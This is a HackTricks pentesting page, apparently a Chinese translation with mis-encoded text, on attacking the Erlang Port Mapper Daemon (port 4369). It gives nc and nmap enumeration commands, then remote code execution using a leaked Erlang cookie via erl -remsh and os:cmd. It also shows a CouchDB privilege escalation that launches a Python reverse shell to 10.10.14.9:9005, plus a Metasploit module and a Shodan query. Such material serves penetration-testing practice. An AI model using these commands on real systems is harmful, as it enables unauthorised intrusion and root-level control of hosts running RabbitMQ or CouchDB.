<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# åŸºæœ¬ä¿¡æ¯

**Erlang Port Mapper Daemon (epmd)** ä½œä¸ºåˆ†å¸ƒå¼Erlangå®ä¾‹çš„åè°ƒå™¨ã€‚å®ƒè´Ÿè´£å°†ç¬¦å·èŠ‚ç‚¹åç§°æ˜ å°„åˆ°æœºå™¨åœ°å€ï¼Œä»æ ¹æœ¬ä¸Šç¡®ä¿æ¯ä¸ªèŠ‚ç‚¹åç§°ä¸ç‰¹å®šåœ°å€ç›¸å…³è”ã€‚**epmd**çš„è¿™ä¸€è§’è‰²å¯¹äºä¸åŒErlangèŠ‚ç‚¹åœ¨ç½‘ç»œä¸­çš„æ— ç¼äº¤äº’å’Œé€šä¿¡è‡³å…³é‡è¦ã€‚

**é»˜è®¤ç«¯å£**ï¼š4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
è¿™åœ¨RabbitMQå’ŒCouchDBå®‰è£…ä¸­é»˜è®¤ä½¿ç”¨ã€‚

# æšä¸¾

## æ‰‹åŠ¨
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## è‡ªåŠ¨
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## è¿œç¨‹è¿æ¥

å¦‚æœä½ èƒ½**æ³„éœ²è®¤è¯cookie**ï¼Œä½ å°†èƒ½å¤Ÿåœ¨ä¸»æœºä¸Šæ‰§è¡Œä»£ç ã€‚é€šå¸¸ï¼Œè¿™ä¸ªcookieä½äº`~/.erlang.cookie`ä¸­ï¼Œå¹¶ä¸”æ˜¯ç”±erlangåœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶ç”Ÿæˆçš„ã€‚å¦‚æœæ²¡æœ‰è¢«ä¿®æ”¹æˆ–æ‰‹åŠ¨è®¾ç½®ï¼Œå®ƒå°†æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º20ä¸ªå­—ç¬¦çš„éšæœºå­—ç¬¦ä¸²[A:Z]ã€‚
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)\
ä½œè€…è¿˜åˆ†äº«äº†ä¸€ä¸ªç”¨äºæš´åŠ›ç ´è§£ cookie çš„ç¨‹åº:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## æœ¬åœ°è¿æ¥

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æ»¥ç”¨CouchDBä»¥åœ¨æœ¬åœ°æå‡æƒé™:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
ä»[https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)ä¸­è·å–çš„ç¤ºä¾‹\
æ‚¨å¯ä»¥ä½¿ç”¨**Canape HTBæœºå™¨**æ¥**ç»ƒä¹ **å¦‚ä½•**åˆ©ç”¨æ­¤æ¼æ´**ã€‚

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "at port"`


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚ 

</details>
